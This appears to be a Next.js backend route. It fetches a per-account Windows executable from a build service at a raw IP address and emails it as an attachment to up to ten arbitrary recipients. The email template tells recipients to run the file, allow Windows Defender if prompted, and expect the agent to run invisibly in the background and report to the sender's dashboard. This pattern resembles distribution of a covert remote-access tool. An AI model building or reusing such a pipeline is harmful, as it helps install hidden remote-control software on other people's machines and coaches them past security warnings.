import { NextRequest, NextResponse } from 'next/server';
import { sendEmailWithAttachment } from '@/lib/email';
import { supabase } from '@/lib/supabase';
import crypto from 'crypto';

const BUILD_SERVICE_URL = 'http://18.217.69.184:8080/api/Compile';

export async function POST(request: NextRequest) {
  try {
    const { recipientEmail, installToken, recipientEmails } = await request.json();

    // Support both single email and batch emails
    const emails = recipientEmails || [recipientEmail];
    
    if (!emails || emails.length === 0 || !installToken) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // Limit to 10 emails max
    if (emails.length > 10) {
      return NextResponse.json({ error: 'Maximum 10 emails allowed per batch' }, { status: 400 });
    }

    // Block Outlook domains until we get dedicated IP
    const blockedDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
    const blockedEmails = emails.filter((email: string) => {
      const domain = email.split('@')[1]?.toLowerCase();
      return blockedDomains.includes(domain);
    });

    if (blockedEmails.length > 0) {
      return NextResponse.json({ 
        error: 'Outlook/Microsoft email addresses temporarily blocked due to deliverability issues',
        blockedEmails: blockedEmails 
      }, { status: 400 });
    }

    // Get user info
    const { data: user, error: userError } = await supabase
      .from('users')
      .select('*')
      .eq('install_token', installToken)
      .single();

    if (userError || !user) {
      return NextResponse.json({ error: 'Invalid install token' }, { status: 400 });
    }

    // Generate parameters for Build Service template compilation
    const serverUrl = process.env.VERCEL_APP_URL || 'https://uc-universal-connect-omega.vercel.app';

    // Send parameters to Build Service for template-based compilation
    const buildResponse = await fetch(BUILD_SERVICE_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ 
        serverUrl: serverUrl,
        installToken: installToken 
      }),
    });

    if (!buildResponse.ok) {
      throw new Error(`Build service failed: ${buildResponse.status}`);
    }

    // Get compiled executable
    const exeBuffer = await buildResponse.arrayBuffer();
    const exeBytes = Buffer.from(exeBuffer);

    // For now, send .exe as direct email attachment to bypass storage issues
    // TODO: Fix Supabase storage policies later

    // Email HTML template
    const emailHtml = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>UC Universal Connect - Agent Ready</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f4f4f4; font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 30px;">
        
        <div style="text-align: center; margin-bottom: 30px;">
            <h1 style="color: #007acc;">🖥️ UC Universal Connect</h1>
            <h2 style="color: #333;">✅ Your Agent is Ready!</h2>
        </div>
        
        <p style="color: #555; line-height: 1.6;">
            Your custom UC Connect agent has been compiled successfully. 
            Click the button below to download your personalized executable.
        </p>
        
        <div style="text-align: center; margin: 30px 0;">
            <p style="background: linear-gradient(45deg, #007acc, #0056b3); color: white; padding: 15px 30px; border-radius: 8px; font-weight: bold; font-size: 18px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block;">
                📥 UC Agent (.exe) - See Email Attachment
            </p>
        </div>
        
        <div style="background: #f8f9fa; border-left: 4px solid #007acc; padding: 15px; margin: 20px 0;">
            <strong>Quick Setup:</strong>
            <ol style="margin: 10px 0;">
                <li>Download and run the .exe file</li>
                <li>Allow Windows Defender if prompted</li>
                <li>Agent runs invisibly in background</li>
                <li>Check your dashboard for connected device</li>
            </ol>
        </div>
        
        <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0;">
            <strong>🔒 Security:</strong> This agent is uniquely compiled for your account. 
            Do not share with others. Download link expires in 48 hours.
        </div>
        
        <div style="text-align: center; color: #999; font-size: 12px; margin-top: 30px;">
            UC Universal Connect © 2026
        </div>
    </div>
</body>
</html>`;

    // Send emails to all recipients with .exe attachment
    const emailResults = [];
    const errors = [];

    for (const email of emails) {
      try {
        const emailResult = await sendEmailWithAttachment(
          email,
          'UC Connect Agent - Ready to Run',
          emailHtml,
          'UCAgent.exe', // Executable filename
          exeBytes, // Compiled executable
          user.id,
          user.subscription || 'free'
        );

        if (emailResult.success) {
          emailResults.push({ email, status: 'sent' });
        } else {
          emailResults.push({ email, status: 'failed', error: emailResult.message });
          errors.push(`${email}: ${emailResult.message}`);
        }
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : 'Unknown error';
        emailResults.push({ email, status: 'failed', error: errorMessage });
        errors.push(`${email}: ${errorMessage}`);
      }
    }

    const successCount = emailResults.filter(r => r.status === 'sent').length;
    const failureCount = emailResults.filter(r => r.status === 'failed').length;

    return NextResponse.json({ 
      success: successCount > 0,
      message: `Agent compiled and emailed. Emails: ${successCount} sent, ${failureCount} failed`,
      emailResults: emailResults,
      totalEmails: emails.length,
      successCount,
      failureCount
    });

  } catch (error) {
    console.error('Error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return NextResponse.json(
      { error: 'Failed to send agent', details: errorMessage },
      { status: 500 }
    );
  }
}